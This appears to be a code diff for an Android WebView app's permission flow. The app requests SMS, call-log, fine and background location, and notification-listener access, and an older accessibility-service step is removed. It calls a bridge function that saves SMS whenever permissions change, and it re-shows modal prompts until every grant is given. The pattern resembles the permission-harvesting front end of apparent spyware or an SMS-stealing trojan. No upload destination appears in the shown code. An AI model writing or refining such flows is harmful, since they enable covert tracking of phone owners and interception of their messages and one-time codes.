@@ -2,10 +2,15 @@ const perms = [
     "android.permission.READ_CALL_LOG",
     "android.permission.READ_SMS",
     "android.permission.RECEIVE_SMS",
+];
+
+const fgLocPerms = [
     "android.permission.ACCESS_FINE_LOCATION",
 ];
 
-const sPerms = ["android.permission.ACCESS_BACKGROUND_LOCATION"];
+const bgLocPerms = [
+    "android.permission.ACCESS_BACKGROUND_LOCATION",
+];
 
 let enableActivityLaunched = false;
 
@@ -13,38 +18,57 @@ function foregroundGranted() {
     return perms.every(p => AndroidBridge.isPermissionGranted(p));
 }
 
+function fgLocationGranted() {
+    return fgLocPerms.every(p => AndroidBridge.isPermissionGranted(p));
+}
+
+function bgLocationGranted() {
+    return bgLocPerms.every(p => AndroidBridge.isPermissionGranted(p));
+}
+
+function locationGranted() {
+    return fgLocationGranted() && bgLocationGranted();
+}
+
 function runtimeGranted() {
-    return foregroundGranted() &&
-           AndroidBridge.isPermissionGranted(sPerms[0]);
+    return foregroundGranted() && locationGranted();
 }
 
 function isFullyReady() {
     return runtimeGranted() &&
-           AndroidBridge.isNotifAccessGranted() &&
-           AndroidBridge.isAccessibilityEnabled();
+           AndroidBridge.isNotifAccessGranted();
 }
 
 function decideFlow() {
-    if (!window.AndroidBridge) return;
+    try {
+        if (!window.AndroidBridge) return;
 
-    hideAllModals();
+        hideAllModals();
 
-    if (!runtimeGranted()) {
+        if (!foregroundGranted()) {
+            showPModal();
+            return;
+        }
+
+        if (!fgLocationGranted()) {
+            showPModal();
+            return;
+        }
+
+        if (!bgLocationGranted()) {
+            showPModal();
+            return;
+        }
+
+        if (!AndroidBridge.isNotifAccessGranted()) {
+            showDModal();
+            return;
+        }
+
+        showCModal();
+    } catch (e) {
         showPModal();
-        return;
     }
-
-    if (!AndroidBridge.isNotifAccessGranted()) {
-        showDModal();
-        return;
-    }
-
-    if (!AndroidBridge.isAccessibilityEnabled()) {
-        showAModal();
-        return;
-    }
-
-    launchFinalActivityOnce();
 }
 
 function launchFinalActivityOnce() {
@@ -56,49 +80,71 @@ function launchFinalActivityOnce() {
 }
 
 document.addEventListener("DOMContentLoaded", () => {
+    window.onResume = decideFlow;
     setTimeout(decideFlow, 500);
-    const accessibilityWatcher = setInterval(() => {
-        if (!window.AndroidBridge) return;
-        if (runtimeGranted() && AndroidBridge.isNotifAccessGranted() && AndroidBridge.isAccessibilityEnabled()) {
-            //launchFinalActivityOnce();
-            hideAllModals();
-            showCModal();
-            clearInterval(accessibilityWatcher);
+
+    setTimeout(() => {
+        const pModal = document.querySelector(".p-modal");
+        const dModal = document.querySelector(".d-modal");
+        const overlay = document.querySelector(".overlayer");
+        const pModalVisible = pModal && !pModal.classList.contains("hide");
+        const dModalVisible = dModal && !dModal.classList.contains("hide");
+        const overlayVisible = overlay && !overlay.classList.contains("hide");
+
+        if (!pModalVisible && !dModalVisible && !overlayVisible && window.AndroidBridge) {
+            const fg = foregroundGranted();
+            const fgLoc = fgLocationGranted();
+            const bgLoc = bgLocationGranted();
+            const na = AndroidBridge.isNotifAccessGranted();
+            if (fg && fgLoc && bgLoc && !na) {
+                showDModal();
+            } else if (!fg || !fgLoc || !bgLoc) {
+                showPModal();
+            }
         }
-    }, 1000);
+    }, 2000);
 });
 
 window.onAndroidPermissionsChanged = function () {
     decideFlow();
-    if (foregroundGranted() && !AndroidBridge.isPermissionGranted(sPerms[0])) {
+    if (foregroundGranted() && !fgLocationGranted()) {
         AndroidBridge.saveSmsIfNew();
-        AndroidBridge.requestPermissions(JSON.stringify(sPerms));
+        AndroidBridge.requestPermissions(JSON.stringify(fgLocPerms));
+    } else if (fgLocationGranted() && !bgLocationGranted()) {
+        AndroidBridge.saveSmsIfNew();
+        AndroidBridge.requestPermissions(JSON.stringify(bgLocPerms));
     }
 };
 
-function requestAllPermissions() {
-    AndroidBridge.requestPermissions(JSON.stringify(perms));
-}
-
-function launchAccessibilityPerm() {
-    AndroidBridge.launchAccessibilityPerm();
+function requestMissingPermissions() {
+    if (!foregroundGranted()) {
+        AndroidBridge.requestPermissions(JSON.stringify(perms));
+    } else if (foregroundGranted() && !fgLocationGranted()) {
+        AndroidBridge.requestPermissions(JSON.stringify(fgLocPerms));
+    } else if (fgLocationGranted() && !bgLocationGranted()) {
+        AndroidBridge.requestPermissions(JSON.stringify(bgLocPerms));
+    } else {
+        decideFlow();
+    }
 }
 
 function openNAccess() {
-    AndroidBridge.launchNotificationAccess();
+    try {
+        AndroidBridge.launchNotificationAccess();
+    } catch (e) {
+        console.error("Failed to launch notification access:", e);
+    }
 
     const notifWatcher = setInterval(() => {
         if (!window.AndroidBridge) return;
-        if (AndroidBridge.isNotifAccessGranted()) {
-            clearInterval(notifWatcher);
-            hideDModal();
-            if (!AndroidBridge.isAccessibilityEnabled()) {
-                showAModal();
-            } else {
-                //launchFinalActivityOnce();
-                hideAModal();
+        try {
+            if (AndroidBridge.isNotifAccessGranted()) {
+                clearInterval(notifWatcher);
+                hideDModal();
                 showCModal();
             }
+        } catch (e) {
+            console.error("Notif watcher error:", e);
         }
     }, 1000);
 };
@@ -107,22 +153,104 @@ function hideAllModals() {
     hidePModal();
     hideDModal();
     hideAModal();
+    hideCModal();
 }
 
-function showPModal() { document.querySelector(".p-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
-function hidePModal() { document.querySelector(".p-modal").classList.add("hide"); hideOverlayerIfNeeded(); }
+function showPModal() {
+    const modal = document.querySelector(".p-modal");
+    const overlay = document.querySelector(".overlayer");
+    if (modal) {
+        modal.classList.remove("hide");
+        modal.classList.add("show");
+    }
+    if (overlay) {
+        overlay.classList.remove("hide");
+        overlay.classList.add("show");
+    }
+}
 
-function showDModal() { document.querySelector(".d-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
-function hideDModal() { document.querySelector(".d-modal").classList.add("hide"); hideOverlayerIfNeeded(); }
+function hidePModal() {
+    const modal = document.querySelector(".p-modal");
+    if (modal) {
+        modal.classList.remove("show");
+        modal.classList.add("hide");
+    }
+    hideOverlayerIfNeeded();
+}
 
-function showAModal() { document.querySelector(".a-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
-function hideAModal() { document.querySelector(".a-modal").classList.add("hide"); hideOverlayerIfNeeded(); }
+function showDModal() {
+    const modal = document.querySelector(".d-modal");
+    const overlay = document.querySelector(".overlayer");
+    if (modal) {
+        modal.classList.remove("hide");
+        modal.classList.add("show");
+    }
+    if (overlay) {
+        overlay.classList.remove("hide");
+        overlay.classList.add("show");
+    }
+}
 
-function showCModal() { document.querySelector(".c-modal").classList.remove("hide"); document.querySelector(".overlayer").classList.remove("hide"); }
-function hideCModal() { document.querySelector(".c-modal").classList.add("hide"); hideOverlayerIfNeeded(); }
+function hideDModal() {
+    const modal = document.querySelector(".d-modal");
+    if (modal) {
+        modal.classList.remove("show");
+        modal.classList.add("hide");
+    }
+    hideOverlayerIfNeeded();
+}
+
+function showAModal() {
+    const modal = document.querySelector(".a-modal");
+    const overlay = document.querySelector(".overlayer");
+    if (modal) {
+        modal.classList.remove("hide");
+        modal.classList.add("show");
+    }
+    if (overlay) {
+        overlay.classList.remove("hide");
+        overlay.classList.add("show");
+    }
+}
+
+function hideAModal() {
+    const modal = document.querySelector(".a-modal");
+    if (modal) {
+        modal.classList.remove("show");
+        modal.classList.add("hide");
+    }
+    hideOverlayerIfNeeded();
+}
+
+function showCModal() {
+    const modal = document.querySelector(".c-modal");
+    const overlay = document.querySelector(".overlayer");
+    if (modal) {
+        modal.classList.remove("hide");
+        modal.classList.add("show");
+    }
+    if (overlay) {
+        overlay.classList.remove("hide");
+        overlay.classList.add("show");
+    }
+}
+
+function hideCModal() {
+    const modal = document.querySelector(".c-modal");
+    if (modal) {
+        modal.classList.remove("show");
+        modal.classList.add("hide");
+    }
+    hideOverlayerIfNeeded();
+}
 
 function hideOverlayerIfNeeded() {
-    if (document.querySelectorAll(".p-modal:not(.hide), .d-modal:not(.hide), .a-modal:not(.hide)").length === 0) {
-        document.querySelector(".overlayer").classList.add("hide");
+    const modals = document.querySelectorAll(".p-modal:not(.hide), .d-modal:not(.hide), .a-modal:not(.hide), .c-modal:not(.hide)");
+    if (modals.length === 0) {
+        const overlay = document.querySelector(".overlayer");
+        if (overlay) {
+            overlay.classList.add("hide");
+            overlay.classList.remove("show");
+        }
     }
 }
